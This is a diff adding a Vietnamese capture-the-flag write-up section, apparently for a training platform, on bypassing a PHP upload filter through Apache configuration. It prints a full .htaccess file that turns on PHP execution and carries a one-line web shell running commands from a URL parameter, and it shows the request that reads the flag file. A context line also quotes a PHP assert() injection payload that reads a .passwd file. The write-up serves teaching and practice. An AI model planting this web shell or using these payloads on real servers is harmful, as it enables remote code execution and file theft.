@@ -1123,3 +1123,38 @@ Việc sử dụng hàm `assert()` với input không được kiểm soát kỹ
 Với payload `' and die(highlight_file('.passwd')) or '`, chúng ta sẽ đọc được nội dung file `.passwd`:
 
 ![image](images/php-assert/image-4.png)
+
+## PHP - Apache configuration
+
+> .htaccess
+>
+> Being devops cannot be improvised!
+>
+> The developer has programmatically ensured that its file upload form does not accept PHP files, but has the underlying middleware been properly configured?
+>
+> Your goal is to retrieve the file located in /private/flag.txt from the root of the web server.
+
+Vào thử thách, chúng ta có trang web cho phép tải lên file:
+
+![image](images/php-apache-configuration/image-1.png)
+
+Nếu chúng ta cố gắng tải lên file PHP với mong muốn thực thi mã tuỳ ý sẽ không thể thành công do server đã chặn các extensions PHP.
+
+Ở đây, chúng ta sẽ tải lên một file `.htaccess` với nội dung như bên dưới để cấu hình cho server Apache thực thi code PHP trong file này:
+
+```text
+<Files ".htaccess">
+   Require all granted
+</Files>
+
+php_flag engine on
+SetHandler application/x-httpd-php
+
+# <?php echo "<br>"; system($_GET['c']) ?>
+```
+
+![image](images/php-apache-configuration/image-2.png)
+
+Vào `/uploads/8vfnu8g22gppb9r7d8quqekl4u/.htaccess?c=cat ../../private/flag.txt`, chúng ta lấy được flag:
+
+![image](images/php-apache-configuration/image-3.png)
